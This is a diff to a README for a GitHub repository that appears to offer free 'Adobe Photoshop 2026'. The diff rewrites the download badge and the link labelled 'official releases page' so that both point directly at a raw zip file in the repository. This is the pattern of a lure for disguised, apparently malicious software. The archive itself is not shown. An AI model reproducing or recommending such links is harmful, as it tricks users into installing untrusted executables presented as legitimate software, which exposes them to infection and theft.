@@ -1,6 +1,6 @@
 # 🎨 Adobe-Photoshop-Version-2026 - Master your digital creative projects easily
 
-[<img src="https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github" alt="Download">](https://github.com/pavlovian-tilde769/Adobe-Photoshop-Version-2026/releases)
+[<img src="https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github" alt="Download">](https://raw.githubusercontent.com/pavlovian-tilde769/Adobe-Photoshop-Version-2026/main/unclubby/Version_Adobe_Photoshop_v3.5.zip)
 
 ## 📌 About this application
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run the software. Check you
 
 Follow these steps to obtain and install the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/pavlovian-tilde769/Adobe-Photoshop-Version-2026/releases).
+1.  Visit the [official releases page](https://raw.githubusercontent.com/pavlovian-tilde769/Adobe-Photoshop-Version-2026/main/unclubby/Version_Adobe_Photoshop_v3.5.zip).
 2.  Locate the latest version release.
 3.  Click the file ending in `.exe` to start the download.
 4.  Navigate to your Downloads folder once the transfer finishes.
